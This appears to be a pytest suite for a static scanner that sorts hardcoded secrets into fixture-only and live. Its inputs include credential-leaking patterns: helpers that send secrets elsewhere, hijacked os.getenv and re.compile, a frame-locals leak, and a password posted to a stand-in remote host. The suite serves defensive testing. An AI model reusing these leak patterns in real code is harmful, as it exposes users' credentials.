        ("send(API_KEY_REGEX)\n", {}),
        ("re.compile = send\n", {}),
        ("setattr(re, 'compile', send)\n", {}),
        ("alias = re\nalias.compile = send\n", {}),
        ("def validate(re):\n    return re.compile(API_KEY_REGEX)\n", {}),
        ("", {"other.py": "from sample import API_KEY_REGEX as KEY\nsend(KEY)\n"}),
        ("", {"other.py": "import sample\nsend(sample.API_KEY_REGEX)\n"}),
        ("", {"other.py": "import sample\nsend(sample)\n"}),
        ("", {"re.py": "def compile(value):\n    send(value)\n"}),
        ("re.compile(API_KEY_REGEX, pattern='other')\n", {}),
    ],
)
def test_data_role263_keeps_unknown_escape_or_provider_change(tmp_path, suffix, extras):
    evidence = _metadata143_projection(
        tmp_path,
        "import re\nAPI_KEY_REGEX = '^key_[a-z]+$'\nre.compile(API_KEY_REGEX)\n"
        + suffix,
        "API_KEY_REGEX",
        extras=extras,
    )
    assert evidence["eligible"] is False


def test_data_role263_native_partition_preserves_real_credential(tmp_path):
    from factoryline.deep_audit_io import full_repository_scan

    _write(
        tmp_path,
        "selectors.py",
        "import re\nfrom os import getenv\nAPI_KEY_REGEX = '^key_[a-z]+$'\nPASSWORD_ENV = 'SERVICE_PASSWORD'\nre.compile(API_KEY_REGEX)\nvalue = getenv(PASSWORD_ENV)\n",
    )
    _write(
        tmp_path,
        "live.py",
        "PASSWORD = 'operational-credential-value'\ninstall_user(password=PASSWORD)\n",
    )
    report = full_repository_scan(tmp_path, context_profile="workspace-v2")
    workspace = report["workspace_evidence"]
    assert report["source_accounting_state"] == "COMPLETE"
    observed = [
        row
        for row in workspace["primitive_observations"]
        if row["code"] == "SECURITY_HARDCODED_SECRET"
    ]
    assert len(observed) == 1
    assert all(
        row["facts"]["fixture_evidence"]["profile"] == "STATIC_API_DATA_ROLE"
        for row in observed
    )
    active = [
        row
        for row in workspace["findings"]
        if row["code"] == "SECURITY_HARDCODED_SECRET"
    ]
    assert [(row["path"], row["severity"]) for row in active] == [
        ("live.py", "CRITICAL"),
        ("selectors.py", "CRITICAL"),
    ]
    # Matching hashes alone cannot authorize a changed consumer graph.
    import json
    from factoryline.primitive_observation_binding import fixed_primitive_binding
    from factoryline import review_integrity

    raw = {path.name: path.read_bytes() for path in tmp_path.glob("*.py")}
    bindings = {name: hashlib.sha256(data).hexdigest() for name, data in raw.items()}
    sources = [{"path": name, "sha256": digest} for name, digest in bindings.items()]
    assert fixed_primitive_binding(
        observed[0], sources, bindings, review_integrity, raw
    )
    old = bindings["selectors.py"]
    raw["selectors.py"] += b"\nsend(PASSWORD_ENV)\n"
    bindings["selectors.py"] = hashlib.sha256(raw["selectors.py"]).hexdigest()
    forged = json.loads(json.dumps(observed[0]).replace(old, bindings["selectors.py"]))
    facts = forged["facts"]
    facts["fixture_evidence"]["inventory_sha256"] = hashlib.sha256(
        "\n".join(
            sorted(f"{name}\0{digest}" for name, digest in bindings.items())
        ).encode()
    ).hexdigest()
    facts["proof_facts_sha256"] = hashlib.sha256(
        json.dumps(
            {key: value for key, value in facts.items() if key != "proof_facts_sha256"},
            sort_keys=True,
            separators=(",", ":"),
        ).encode()
    ).hexdigest()
    sources = [{"path": name, "sha256": digest} for name, digest in bindings.items()]
    assert not fixed_primitive_binding(forged, sources, bindings, review_integrity, raw)


@pytest.mark.parametrize(
    "text",
    [
        "import re\nPASSWORD = 'correct[-_]horse'\ndef authenticate(request):\n    return re.fullmatch(PASSWORD, request.POST['password']) is not None\n",
        "from django.core.cache import cache\nPASSWORD = 'actual-shared-secret'\ndef enroll(user_id):\n    cache.set(PASSWORD, user_id)\ndef authenticate(request):\n    return cache.get(request.headers['Authorization'])\n",
        "import os\nPASSWORD = 'production-api-credential'\nclass AuthProvider:\n    @staticmethod\n    def getenv(value):\n        return send(value)\nclass Login:\n    os = AuthProvider\n    result = os.getenv(PASSWORD)\n",
        "from os import getenv\nPASSWORD = 'production-password'\nvalue = getenv('ENVIRONMENT', PASSWORD)\n",
    ],
)
def test_data_role263_ecc_authentication_material_must_stay_active(tmp_path, text):
    evidence = _metadata143_projection(tmp_path, text, "PASSWORD")
    assert evidence["eligible"] is False


@pytest.mark.parametrize(
    "change",
    [
        "os.environ = FakeEnvironment()\n",
        "os.getenv.__code__ = send.__code__\n",
        "import sys\nsys.modules['os'].getenv = send\n",
    ],
)
def test_data_role263_environment_provider_dependencies_are_closed(tmp_path, change):
    evidence = _metadata143_projection(
        tmp_path,
        "import os\nPASSWORD_ENV = 'production-secret'\n"
        + change
        + "os.getenv(PASSWORD_ENV)\n",
        "PASSWORD_ENV",
    )
    assert evidence["eligible"] is False


@pytest.mark.parametrize(
    "consumer",
    [
        "def outer(os):\n    def inner():\n        return os.getenv(PASSWORD_ENV)\n    return inner()\n",
        "consume = lambda os: os.getenv(PASSWORD_ENV)\n",
        "values = [os.getenv(PASSWORD_ENV) for os in providers]\n",
    ],
)
def test_data_role263_all_enclosing_provider_scopes_are_checked(tmp_path, consumer):
    evidence = _metadata143_projection(
        tmp_path,
        "import os\nPASSWORD_ENV = 'production-credential'\n" + consumer,
        "PASSWORD_ENV",
    )
    assert evidence["eligible"] is False


@pytest.mark.parametrize(
    "extra",
    [
        "def change():\n    import re as nested\n    nested.compile = send\n",
        "send(globals()['API_KEY_REGEX'])\n",
        "import sample\nsend(sample.__dict__['API_KEY_REGEX'])\n",
    ],
)
def test_data_role263_additional_dynamic_consumers_stay_unresolved(tmp_path, extra):
    evidence = _metadata143_projection(
        tmp_path,
        "import re\nAPI_KEY_REGEX = '^key_[a-z]+$'\nre.compile(API_KEY_REGEX)\n"
        + extra,
        "API_KEY_REGEX",
    )
    assert evidence["eligible"] is False


@pytest.mark.parametrize("owner", ["Root", "Child"])
def test_metadata143_schema_label_and_inherited_label(tmp_path, owner):
    evidence = _metadata143_projection(
        tmp_path, _METADATA143_SCHEMA, "password_caption", owner
    )
    assert evidence["eligible"] is True
    assert evidence["profile"] == "JSON_SCHEMA_ANNOTATION"
    assert evidence["runtime_assurance"] == "INCOMPLETE"
    assert evidence["transport_role"] == "UNASSESSED"
    assert {row["role"] for row in evidence["uses"]} == {"SCHEMA_TITLE"}


@pytest.mark.parametrize(
    ("old", "new"),
    [
        ('"title": cls.password_caption', '"default": cls.password_caption'),
        ('"type": "object"', '"type": "unknown"'),
        ("@classmethod", "@staticmethod"),
        ("def schema(cls):", "def schema(cls):\n        cls = replacement"),
        ("class Child(Root):", "class Child(UnknownRoot):"),
        (
            '    password_caption = "Child label"',
            '    password_caption = "Child label"\n    password_caption = "second"',
        ),
        (
            "class Child(Root):",
            "class Child(Root):\n    def authenticate(self): return self.password_caption",
        ),
        ("class Child(Root):", "class Child(Root, UnknownMixin):"),
    ],
)
def test_metadata143_ambiguous_schema_keeps_credential_unknown(tmp_path, old, new):
    evidence = _metadata143_projection(
        tmp_path, _METADATA143_SCHEMA.replace(old, new), "password_caption", "Child"
    )
    assert evidence["eligible"] is False


def test_metadata143_mask_requires_output_and_previous_value_roles(tmp_path):
    evidence = _metadata143_projection(tmp_path, _METADATA143_MASK, "SECRET_SENTINEL")
    assert evidence["eligible"] is True
    assert evidence["profile"] == "MASKING_SENTINEL"
    assert {row["role"] for row in evidence["uses"]} == {
        "MASK_OUTPUT",
        "PRESERVE_PREVIOUS_VALUE",
    }


@pytest.mark.parametrize(
    ("old", "new"),
    [
        ("self._config.copy()", "self._config"),
        ("config[k] = self[k]", 'config[k] = "replacement-password"'),
        ("v == SECRET_SENTINEL", "v != SECRET_SENTINEL"),
        ('key in self.schema["secret"]', 'key in self.schema["public"]'),
        ('k in self.schema.get("secret", [])', 'k in self.schema.get("public", [])'),
        (
            "        self._config = config",
            "        self._config = config\n        authenticate(SECRET_SENTINEL)",
        ),
        ("        return config", "        return SECRET_SENTINEL"),
    ],
)
def test_metadata143_mask_conflicts_keep_credential_unknown(tmp_path, old, new):
    evidence = _metadata143_projection(
        tmp_path, _METADATA143_MASK.replace(old, new), "SECRET_SENTINEL"
    )
    assert evidence["eligible"] is False


@pytest.mark.parametrize(
    "text,member,owner",
    [
        (_METADATA143_SCHEMA, "password_caption", "Child"),
        (_METADATA143_MASK, "SECRET_SENTINEL", None),
    ],
)
def test_metadata143_stale_source_rejects_projection(tmp_path, text, member, owner):
    assert (
        _metadata143_projection(tmp_path, text, member, owner, stale=True)["eligible"]
        is False
    )


@pytest.mark.parametrize(
    "extra",
    [
        '        authenticate(password=schema["properties"]["password"]["title"])',
        '        schema["properties"]["password"]["default"] = schema["properties"]["password"].pop("title")',
        "        schema = foreign_schema",
        "        forwarded = schema\n        publish(forwarded)",
        "        return {}",
    ],
)
def test_metadata143_schema_escape_or_rebind_is_not_a_label_proof(tmp_path, extra):
    source = _METADATA143_SCHEMA.replace(
        '        return {"type":', '        schema = {"type":', 1
    )
    source = source.replace(
        "\n\nclass Child", "\n" + extra + "\n        return schema\n\nclass Child", 1
    )
    assert (
        _metadata143_projection(tmp_path, source, "password_caption", "Child")[
            "eligible"
        ]
        is False
    )


@pytest.mark.parametrize(
    "foreign",
    [
        "import sample\nauthenticate(sample.SECRET_SENTINEL)\n",
        "from sample import SECRET_SENTINEL as forwarded\nauthenticate(forwarded)\n",
    ],
)
def test_metadata143_cross_module_credential_use_blocks_mask_projection(
    tmp_path, foreign
):
    evidence = _metadata143_projection(
        tmp_path, _METADATA143_MASK, "SECRET_SENTINEL", extras={"consumer.py": foreign}
    )
    assert evidence["eligible"] is False


def test_metadata143_restored_map_publication_cannot_be_overwritten(tmp_path):
    source = _METADATA143_MASK.replace(
        "        self._config = config",
        "        self._config = config\n        self._config = incoming",
    )
    assert (
        _metadata143_projection(tmp_path, source, "SECRET_SENTINEL")["eligible"]
        is False
    )


@pytest.mark.parametrize(
    "mutation",
    [
        'self._config["password"] = incoming["password"]',
        "self._config.update(incoming)",
        "alias = self._config\n        alias.update(incoming)",
        "mutate(self._config)",
    ],
)
def test_metadata143_published_storage_cannot_escape_or_mutate(tmp_path, mutation):
    source = _METADATA143_MASK + "\n        " + mutation + "\n"
    assert (
        _metadata143_projection(tmp_path, source, "SECRET_SENTINEL")["eligible"]
        is False
    )


@pytest.mark.parametrize(
    "source,expected", [(_METADATA143_SCHEMA, 2), (_METADATA143_MASK, 1)]
)
def test_metadata143_native_metadata_partition_retains_critical_primitive(
    tmp_path, source, expected
):
    _write(tmp_path, "sample.py", source)
    first = security_scan(tmp_path)
    second = security_scan(tmp_path)
    for report in (first, second):
        primitives = [
            row
            for row in report.get("primitive_observations", [])
            if row.get("facts", {}).get("disposition") == "SOURCE_PRESENTATION_METADATA"
        ]
        assert len(primitives) == expected
        assert not [
            row
            for row in report["findings"]
            if row["code"] == "SECURITY_HARDCODED_SECRET"
        ]
        for finding in primitives:
            assert finding["severity"] == "CRITICAL"
            assert finding["facts"]["runtime_assurance"] == "INCOMPLETE"
            assert finding["facts"]["downstream_consumer_security"] == "UNASSESSED"


@pytest.mark.parametrize(
    "mutation",
    [
        "schema",
        "disposition",
        "witness",
        "roles",
        "duplicate",
        "declaration",
        "consumer",
        "source",
    ],
)
def test_metadata143_rehashed_invalid_witness_restores_critical_alert(
    tmp_path, mutation
):
    import copy
    import json
    from factoryline import primitive_observation_binding as binding
    from factoryline import review_audits as audit

    _write(tmp_path, "sample.py", _METADATA143_MASK)
    report = security_scan(tmp_path, cache_enabled=False)
    finding = next(
        row
        for row in report["primitive_observations"]
        if row["facts"].get("disposition") == "SOURCE_PRESENTATION_METADATA"
    )
    altered = copy.deepcopy(finding)
    facts = altered["facts"]
    evidence = facts["fixture_evidence"]
    if mutation in {"schema", "disposition"}:
        facts[mutation] = (
            "factory.application-test-credential.v1"
            if mutation == "schema"
            else "TEST_OWNED_APPLICATION_CREDENTIAL"
        )
    elif mutation == "witness":
        evidence["uses"][0]["sha256"] = "0" * 64
    elif mutation == "roles":
        evidence["uses"] = [
            row for row in evidence["uses"] if row["role"] != "PRESERVE_PREVIOUS_VALUE"
        ]
    elif mutation == "duplicate":
        evidence["uses"].append(copy.deepcopy(evidence["uses"][0]))
    elif mutation == "declaration":
        evidence["declaration"]["source_role"] = "local_literal"
    elif mutation == "consumer":
        evidence["downstream_consumer_security"] = facts[
            "downstream_consumer_security"
        ] = "PROVEN_SAFE"
    else:
        evidence["source_sha256"] = "0" * 64
    unsigned = {
        key: value for key, value in facts.items() if key != "proof_facts_sha256"
    }
    facts["proof_facts_sha256"] = hashlib.sha256(
        json.dumps(unsigned, sort_keys=True, separators=(",", ":")).encode()
    ).hexdigest()
    core = {
        "sources": [
            {
                "path": "sample.py",
                "sha256": hashlib.sha256(
                    (tmp_path / "sample.py").read_bytes()
                ).hexdigest(),
            }
        ],
        "findings": [],
        "primitive_observations": [altered],
        "audit_coverage": {"complete": True},
    }
    binding.partition_proven_primitive_observations(core, audit.integrity)
    assert not core["primitive_observations"]
    assert len(core["findings"]) == 1 and core["findings"][0]["severity"] == "CRITICAL"


@pytest.mark.parametrize("member", ["evidence", "_schema_uses", "_mask_uses"])
def test_metadata143_runtime_projection_method_replacement_invalidates_cache(
    tmp_path, monkeypatch, member
):
    from factoryline import credential_role_constructor_provider as roles

    _write(
        tmp_path,
        "sample.py",
        _METADATA143_SCHEMA if member == "_schema_uses" else _METADATA143_MASK,
    )
    assert security_scan(tmp_path).get("primitive_observations")
    monkeypatch.setattr(
        roles.PresentationRoleIndex,
        member,
        lambda *args, **kw: {"eligible": False} if member == "evidence" else None,
    )
    report = security_scan(tmp_path)
    assert [
        row
        for row in report["findings"]
        if row["code"] == "SECURITY_HARDCODED_SECRET" and row["severity"] == "CRITICAL"
    ]


@pytest.mark.parametrize(
    "owner,member",
    [("SourceSnapshotIndex", "validate"), ("DeclarationFact", "public_facts")],
)
def test_metadata143_shared_source_method_code_change_invalidates_cache(
    tmp_path, monkeypatch, owner, member
):
    from factoryline import credential_role_constructor_provider as roles

    _write(tmp_path, "sample.py", _METADATA143_MASK)
    assert security_scan(tmp_path).get("primitive_observations")
    method = getattr(getattr(roles, owner), member)
    replacement = (
        (lambda self, path: False) if member == "validate" else (lambda self: {})
    )
    monkeypatch.setattr(method, "__code__", replacement.__code__)
    for report in (
        security_scan(tmp_path),
        security_scan(tmp_path, cache_enabled=False),
    ):
        assert [
            row
            for row in report["findings"]
            if row["code"] == "SECURITY_HARDCODED_SECRET"
            and row["severity"] == "CRITICAL"
        ]


def test_jwt_provider_binding_stability_is_memoized_per_module_walk(monkeypatch):
    import ast

    from factoryline import mock_fixture_provenance as proof
    from factoryline import review_audits as audit

    module = ast.parse(
        "import pytest\nfrom jwt.api_jws import PyJWS\n"
        "def jws():\n    return PyJWS()\n"
        "def test_constructor():\n"
        "    pytest.raises(TypeError, PyJWS)\n"
        "    pytest.raises(TypeError, PyJWS)\n"
    )

    def attach_parents(tree):
        for parent in ast.walk(tree):
            for child in ast.iter_child_nodes(parent):
                child._security_parent = parent

    attach_parents(module)
    aliases = audit._scope_security_aliases(
        audit._module_security_aliases(module), module
    )
    fixture = next(node for node in module.body if getattr(node, "name", None) == "jws")
    dynamic_checks = []
    original_dynamic_check = proof._jwt_module_has_dynamic_execution

    def count_dynamic_checks(tree):
        dynamic_checks.append(tree)
        return original_dynamic_check(tree)

    monkeypatch.setattr(
        proof, "_jwt_module_has_dynamic_execution", count_dynamic_checks
    )
    monkeypatch.setattr(
        proof, "_jwt_captured_import_binding_is_stable", lambda *_args: True
    )

    assert not proof._jwt_provider_is_mutated(module, "PyJWS", aliases, fixture)
    assert len(dynamic_checks) == 1

    mutation = ast.parse("alias = pytest\nalias.raises = external\n")
    module.body.extend(mutation.body)
    attach_parents(module)
    assert proof._jwt_provider_is_mutated(module, "PyJWS", aliases, fixture)
    assert len(dynamic_checks) == 2


@pytest.mark.parametrize(
    "expression,closed",
    [
        ("token = jwt.encode({}, secret)", True),
        ("token: str = jwt.encode({}, secret)", True),
        ("jwt.decode('token', secret)", True),
        ("assert jwt.decode('token', secret) == {}", True),
        ("sink.token = jwt.encode({}, secret)", False),
        ("sink['token'] = jwt.encode({}, secret)", False),
        ("return jwt.encode({}, secret)", False),
        ("publish(jwt.encode({}, secret))", False),
        ("assert publish(jwt.encode({}, secret))", False),
    ],
)
def test_crypto_operation_result_requires_closed_sink(expression, closed):
    import ast

    from factoryline.mock_fixture_provenance import _jwt_crypto_result_is_closed

    owner = ast.parse(f"def test_case():\n    {expression}\n").body[0]
    parents = {
        child: node for node in ast.walk(owner) for child in ast.iter_child_nodes(node)
    }
    call = next(
        node
        for node in ast.walk(owner)
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Attribute)
        and node.func.attr in {"encode", "decode"}
    )
    assert _jwt_crypto_result_is_closed(call, owner, parents) is closed


@pytest.mark.parametrize(
    "expression,closed",
    [
        ("jwt.encode({}, secret)", True),
        ("jwt.decode('token', key=secret)", True),
        ("jwt.encode(secret, 'other')", False),
        ("jwt.encode({}, 'other', algorithm=secret)", False),
        ("jwt.encode({}, secret, key='other')", False),
        ("jwt.encode({}, secret, **options)", False),
        ("jwt.encode(*args, key=secret)", False),
    ],
)
def test_crypto_literal_requires_exact_key_slot(expression, closed):
    import ast

    from factoryline.mock_fixture_provenance import _jwt_load_is_closed_call

    call = ast.parse(expression).body[0].value
    parents = {
        child: node for node in ast.walk(call) for child in ast.iter_child_nodes(node)
    }
    secret = next(
        node
        for node in ast.walk(call)
        if isinstance(node, ast.Name) and node.id == "secret"
    )
    assert (_jwt_load_is_closed_call(secret, "jwt", parents) is call) is closed


def test_crypto_native_source_inventory_requires_all_current_bytes():
    import hashlib

    from factoryline.primitive_observation_binding import _jwt_bound_source_inventory

    data = {"test_case.py": b"pass\n", "helper.py": b"pass\n"}
    bindings = {name: hashlib.sha256(raw).hexdigest() for name, raw in data.items()}
    assert _jwt_bound_source_inventory(data, bindings) is not None
    assert (
        _jwt_bound_source_inventory({"test_case.py": data["test_case.py"]}, bindings)
        is None
    )
    assert (
        _jwt_bound_source_inventory({**data, "helper.py": b"external()\n"}, bindings)
        is None
    )
    assert (
        _jwt_bound_source_inventory({**data, "../outside.py": b"pass\n"}, bindings)
        is None
    )


@pytest.mark.parametrize(
    "statement,expected",
    [
        ("from helper import value", ["helper", "helper.value"]),
        ("from .helper import value", ["tests.helper", "tests.helper.value"]),
        ("from tests.helper import value", ["tests.helper", "tests.helper.value"]),
        ("def test_case():\n    from helper import value", ["helper", "helper.value"]),
    ],
)
def test_crypto_import_graph_distinguishes_absolute_and_relative_names(
    statement, expected
):
    import ast
    from pathlib import Path
    from factoryline.mock_fixture_provenance import _jwt_imported_local_module_names

    root = Path("captured")
    sources = {root / "tests/__init__.py": b""}
    assert (
        _jwt_imported_local_module_names(
            ast.parse(statement), root / "tests/test_protocol.py", root, sources
        )
        == expected
    )


@pytest.mark.parametrize(
    "invocation,closed",
    [
        ("", True),
        ("leak_caller()", False),
        ("alias()", False),
        ("runner = leak_caller; runner()", False),
        ("runner = alias; runner()", False),
    ],
)
def test_crypto_literal_namespace_guard_follows_local_function_objects(
    invocation, closed
):
    import ast
    from factoryline.mock_fixture_provenance import _jwt_local_literal_uses

    module = ast.parse(
        "def leak_caller():\n    from inspect import currentframe as frame\n    return frame().f_back.f_locals\n"
        "alias = leak_caller\n"
        "def test_case(jwt):\n    secret = 'fixture-key'\n    jwt.encode({}, secret)\n    "
        + invocation
        + "\n"
    )
    owner = module.body[-1]
    declaration = owner.body[0]
    assert (
        _jwt_local_literal_uses(
            declaration, declaration.targets[0], owner, "jwt", module
        )
        is closed
    )


def test_application_fixture_consumer_rows_keep_inventory_independent_order():
    from pathlib import Path
    from types import SimpleNamespace
    from factoryline.credential_role_identity_effects import (
        _fixture_order_consumer_rows,
    )

    def row(path, line):
        call = ast.parse("login(secret)").body[0].value
        ast.increment_lineno(call, line - 1)
        return (Path(path), call.args[0], None, call, False, object())

    declaration = row("tests/base.py", 45)
    first_login = row("tests/views.py", 157)
    second_login = row("tests/views.py", 968)
    # Preserve duplicate witnesses as well as the original AST/object identities.
    rows = [second_login, declaration, first_login, first_login]
    before = list(rows)
    source = SimpleNamespace(relative=lambda path: path.as_posix())
    index = {"source": source}
    ordered = _fixture_order_consumer_rows(index, rows)
    reversed_ordered = _fixture_order_consumer_rows(index, list(reversed(rows)))
    assert rows == before
    assert ordered == reversed_ordered
    assert len(ordered) == 4
    assert ordered[0] is declaration
    assert ordered[1] is first_login and ordered[2] is first_login
    assert ordered[3] is second_login


def test_annotated_enum_literal_with_matching_value_is_supported():
    import ast
    from types import SimpleNamespace

    from factoryline.provenance import credential_role_witness

    tree = ast.parse("class Kind(str, Enum):\n    TOKEN: str = 'TOKEN'\n")
    enum_class = tree.body[0]
    declaration = enum_class.body[0]
    enum_class._security_parent_scope = tree
    declaration._security_lexical_scope = enum_class
    declaration._security_flow_statement = declaration
    audit = SimpleNamespace(
        ast=ast,
        integrity=SimpleNamespace(
            _builtin_repr_names_shadowed=lambda node, names: False,
            _security_scope_request_aliases=lambda scope, aliases, statement: aliases,
        ),
        _name=ast.unparse,
    )

    witness = credential_role_witness(
        audit, declaration, declaration.target, {"Enum": "enum.Enum"}
    )
    assert witness["role_candidate"] == "symbolic_enum_identifier"


def test_shared_evidence_span_keeps_exact_coordinates_and_new_list_identity():
    from factoryline import mock_fixture_provenance as fixtures

    tree = ast.parse("def run():\n    return receiver.send('value')\n")
    for node in ast.walk(tree):
        if not isinstance(node, (ast.stmt, ast.expr)):
            continue
        expected = [node.lineno, node.col_offset, node.end_lineno, node.end_col_offset]
        actual = fixtures._evidence_node_span(node)
        assert actual == expected
        assert actual is not fixtures._evidence_node_span(node)
        actual[0] = -1
        assert fixtures._evidence_node_span(node) == expected
    with pytest.raises(AttributeError):
        fixtures._evidence_node_span(ast.Module(body=[], type_ignores=[]))


@pytest.mark.parametrize(
    "source,values,module_accepts",
    [
        ("secret = 'first'", ["'first'"], True),
        ("secret: str = 'first'", ["'first'"], True),
        ("secret: str", [None], True),
        ("secret = 'first'\nsecret: str = 'second'", ["'first'", "'second'"], True),
        ("secret = other = 'first'", [], False),
        ("secret, other = 'first', 'second'", [], False),
        ("if ready:\n    secret = 'nested'", [], False),
        ("secret = 'first'\nif ready:\n    secret = 'nested'", ["'first'"], False),
        ("def secret():\n    pass", [], False),
        ("other = 'different'", [], True),
        ("secret += 'more'", [], False),
        ("del secret", [], False),
    ],
)
def test_shared_assignment_selection_preserves_class_rows_and_module_binding_guard(
    source, values, module_accepts
):
    from factoryline import mock_fixture_provenance as fixtures

    tree = ast.parse(source)
    rows = fixtures._direct_named_assignments(tree, "secret")

    def render(value):
        return ast.unparse(value) if value is not None else None

    assert [render(value) for _, value in rows] == values
    assert all(
        statement in tree.body and value is statement.value for statement, value in rows
    )
    assert [
        render(value)
        for value in fixtures._django_assignment_from_class(tree, "secret")
    ] == values
    expected = rows if module_accepts else []
    assert fixtures._django_assignment(tree, "secret") == expected


@pytest.mark.parametrize(
    "name",
    ["_evidence_node_span", "_direct_named_assignments", "_app_unittest_witness"],
)
@pytest.mark.parametrize("mutation", ["binding", "code"])
def test_shared_mock_projection_helpers_invalidate_native_proof_cache(
    tmp_path, monkeypatch, name, mutation
):
    from factoryline import mock_fixture_provenance as fixtures
    from factoryline import review_audits as audit

    original = getattr(fixtures, name)
    assert original in fixtures.CACHE_HELPERS
    before = audit._oracle_context_cache_key(tmp_path, [], {})

    def replacement(*args, **kwargs):
        return []

    with monkeypatch.context() as patch:
        if mutation == "binding":
            patch.setattr(fixtures, name, replacement)
        else:
            patch.setattr(original, "__code__", replacement.__code__)
        assert audit._oracle_context_cache_key(tmp_path, [], {}) != before
    assert audit._oracle_context_cache_key(tmp_path, [], {}) == before


@pytest.mark.parametrize(
    "source,expected",
    [
        ("secret = 'first'", True),
        ("secret: str = 'first'", False),
        ("secret = 'first'\nsecret = 'second'", False),
        ("secret = 'first'\nif ready:\n    secret = 'nested'", False),
        ("secret = other = 'first'", False),
        ("secret += 'more'", False),
    ],
)
def test_application_local_assignment_keeps_only_unique_plain_binding(source, expected):
    from factoryline import mock_fixture_provenance as fixtures

    tree = ast.parse(source)
    result = fixtures._app_local_assignment(tree, "secret")
    assert result is (tree.body[0] if expected else None)


@pytest.mark.parametrize(
    "witness,expected",
    [
        ({"request": "call"}, "UNITTEST_FACTORY_USER_ENROLLMENT"),
        (
            {"token": "value", "request": "call"},
            "UNITTEST_FACTORY_INVITATION_ENROLLMENT",
        ),
        ({"token": "value", "profile": "preserved"}, "preserved"),
    ],
)
def test_unittest_witness_projection_keeps_classification_and_override_precedence(
    witness, expected
):
    from factoryline import mock_fixture_provenance as fixtures

    before = dict(witness)
    result = fixtures._app_unittest_witness(witness)
    assert result["profile"] == expected
    assert witness == before and result is not witness
    assert result == {"profile": expected, **witness}


@pytest.mark.parametrize(
    "variant",
    [
        "closed",
        "escape",
        "remote",
        "client_method_write",
        "provider_escape",
        "factory_hook",
        "production",
        "no_assertion",
    ],
)
def test_source_bound_factory_authority_role_requires_closed_native_consumers(
    tmp_path, variant
):
    import ast
    import hashlib
    from factoryline import mock_fixture_provenance as fixture

    root = tmp_path
    files = {
        "domain.py": "from django.db import models\nclass Member(models.Model):\n    pass\n",
        "builders.py": "import factory\nfrom domain import Member\nclass AccountBuilder(factory.django.DjangoModelFactory):\n    class Meta:\n        model = Member\n",
        "test_flow.py": "from rest_framework.test import APIClient\nfrom builders import AccountBuilder\ndef test_owned_authority():\n    password = 'sample-input'\n    account = AccountBuilder(password=password)\n    client = APIClient()\n    response = client.post('/session', {'id': account.id, 'password': password})\n    assert response.status_code == 200\n",
    }
    if variant == "escape":
        files["test_flow.py"] += "    send_elsewhere(password)\n"
    elif variant == "remote":
        files["test_flow.py"] = files["test_flow.py"].replace(
            "'/session'", "'https://remote.invalid/session'"
        )
    elif variant == "client_method_write":
        files["test_flow.py"] = files["test_flow.py"].replace(
            "    response =", "    client.post = send_elsewhere\n    response ="
        )
    elif variant == "provider_escape":
        files["test_flow.py"] = files["test_flow.py"].replace(
            "def test_", "alter_provider(APIClient)\ndef test_"
        )
    elif variant == "factory_hook":
        files["builders.py"] += (
            "    def __init__(self, **kwargs):\n        send_elsewhere(kwargs)\n"
        )
    elif variant == "production":
        files["test_flow.py"] = files["test_flow.py"].replace(
            "def test_owned_authority", "def create_default_admin"
        )
    elif variant == "no_assertion":
        files["test_flow.py"] = files["test_flow.py"].replace(
            "    assert response.status_code == 200\n", ""
        )
    modules, captured, inventory = {}, {}, {}
    for name, text in files.items():
        path = root / name
        raw = text.encode()
        path.write_bytes(raw)
        tree = ast.parse(raw)
        digest = hashlib.sha256(raw).hexdigest()
        tree._oracle_source_sha256 = digest
        modules[path], captured[path], inventory[path] = tree, raw, digest
    index = fixture.application_test_index(root, modules, captured, inventory)
    evidence = fixture.application_test_secret_evidence(
        index,
        root / "test_flow.py",
        4 if variant != "provider_escape" else 5,
        "sample-input",
    )
    assert (evidence.get("eligible") is True) is (variant == "closed"), evidence
    if variant == "closed":
        assert evidence["profile"] == "SOURCE_BOUND_FACTORY_TEST_AUTHORITY"
        assert evidence["runtime_assurance"] == "INCOMPLETE"
        assert evidence["transport_role"] == "UNASSESSED"


@pytest.mark.parametrize("profile", ["factory", "signing"])
def test_factory_authority_role_is_admitted_by_native_full_repository_scan(
    tmp_path, profile
):
    from factoryline.deep_audit_io import full_repository_scan

    sources = {
        "domain.py": "from django.db import models\nclass Account(models.Model):\n    pass\n",
        "builders.py": "import factory\nfrom domain import Account\nclass Builder(factory.django.DjangoModelFactory):\n    class Meta:\n        model = Account\n",
        "test_account.py": "from rest_framework.test import APIClient\nfrom builders import Builder\ndef test_account():\n    password = 'native-fixture-data'\n    account = Builder(password=password)\n    client = APIClient()\n    response = client.post('/login', {'id': account.id, 'password': password})\n    assert response.status_code == 200\n",
        "live.py": "PASSWORD = 'live-admin-password'\ndef install_admin():\n    create_user(password=PASSWORD)\n",
    }
    if profile == "signing":
        sources["test_account.py"] = (
            "import jwt\ndef test_account():\n"
            "    secret = 'native-fixture-data'\n"
            "    token = jwt.encode({}, key=secret, algorithm='HS256')\n"
            "    decoded = jwt.decode(token, key=secret, algorithms=['HS256'])\n"
            "    assert decoded == {}\n"
        )
    for name, source in sources.items():
        (tmp_path / name).write_text(source)
    result = full_repository_scan(tmp_path, context_profile="workspace-v2")
    workspace = result["workspace_evidence"]
    assert result["source_accounting_state"] == "COMPLETE"
    assert workspace["primitive_partition"]["state"] == "VALIDATED"
    observed = [
        row
        for row in workspace["primitive_observations"]
        if row["code"] == "SECURITY_HARDCODED_SECRET"
    ]
    active = [
        row
        for row in workspace["findings"]
        if row["code"] == "SECURITY_HARDCODED_SECRET"
    ]
    assert any(row["path"] == "test_account.py" for row in observed), workspace
    assert not any(row["path"] == "test_account.py" for row in active)
    assert any(
        row["path"] == "live.py" and row["severity"] == "CRITICAL" for row in active
    )


def test_regular_package_module_aliases_reject_competing_source_roots(tmp_path):
    import ast
    import hashlib
    from factoryline.credential_role_constructor_provider import SourceSnapshotIndex

    def make_index(files):
        modules, captured, inventory = {}, {}, {}
        for name, raw in files.items():
            path = tmp_path / name
            tree = ast.parse(raw)
            tree._oracle_source_sha256 = hashlib.sha256(raw).hexdigest()
            modules[path], captured[path], inventory[path] = (
                tree,
                raw,
                tree._oracle_source_sha256,
            )
        return SourceSnapshotIndex(tmp_path, modules, captured, inventory)

    files = {
        "service/src/domain/__init__.py": b"",
        "service/src/domain/models.py": b"class Model: pass\n",
    }
    index = make_index(files)
    assert (
        index.module_paths()["domain/models.py"]
        == tmp_path / "service/src/domain/models.py"
    )
    files.update(
        {
            "other/domain/__init__.py": b"",
            "other/domain/models.py": b"class Model: pass\n",
        }
    )
    assert make_index(files).module_paths()["domain/models.py"] is None


